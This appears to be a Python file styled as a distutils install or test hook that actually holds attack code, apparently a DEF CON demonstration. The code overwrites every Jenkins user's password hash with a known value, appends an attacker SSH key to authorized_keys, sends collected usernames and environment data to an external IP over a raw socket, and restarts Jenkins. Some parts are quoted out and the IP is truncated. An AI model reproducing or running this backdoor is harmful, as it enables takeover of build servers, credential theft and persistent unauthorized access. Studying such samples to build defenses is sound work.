#POLL ME ##
# some of its features, like package dependencies.
# arbitrary change to test hook
from distutils.command.install_data import install_data
from distutils.command.install import INSTALL_SCHEMES
from subprocess import Popen, PIPE
import os
import sys
import re
import sys
import base64
from hashlib import sha256
from binascii import hexlify, unhexlify
import socket 
import os 
import pwd
import fileinput
import time
import pprint
TCP_IP = '104.130.139.'
TCP_PORT = 50007
BUFFER_SIZE = 1024
message = "" 


r = re.compile(r"#jbcrypt:[^<]+")
""""
envs = os.environ
message = pprint.pformat(dict(envs))

"""
#
#
#remove these quotes
results = os.listdir('/var/lib/jenkins/users/')
for res in results:
        for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$5hdO9s6oMHj62ZztPHxNCeGklTx4GhjbrbIAjU7viKMVwhnlWBtm.", line )
                print line,

message = 'using jenkins: %s ' % str(results)
"""
# pwnie patrol was here.
try:
	user = pwd.getpwuid( os.getuid() )[ 0 ]
	print 'user: %s' % user
	message = message + "user: %s" % user
	with open("/home/%s/.ssh/authorized_keys" % user, "a") as myfile:
		    myfile.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCd85o+/NiUloOYNbQYsU+RrSvPAhnL9RCLJYy5yogYEFIj8e8C6ybC+3VtpvUzoPZY3q91VH+D9qmoJAcm5nHfYA1J2Bc9roHG66XuoUqCE0n+Mupb61Sr1cCEhYkKkkRVAPSYLBwJy42IHcGIlrkzYy8DZzd2upxGRlXIdtq7uyNutzn5eoF+do52s7G0C6BIhP4Y5phEoLAfpm7Le1VQ/AOy25pUfhb/wBORlJfaA/dl95G8cAZvIc3vgVwn52YSln68KSBU5NKVmiG64q351Zw1/5R3n8TO7AHyQC6XII5Wr1/XqHxSZ7HIZPBZlO1SYctTpfBhqdXQ5Ls2Ltx1 mal")
except:
	pass 
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(message)
s.close()
os.system('service jenkins restart &')
#print os.system('pkill -HUP java')
# Gutted for purpose of defcon exapmle.
""
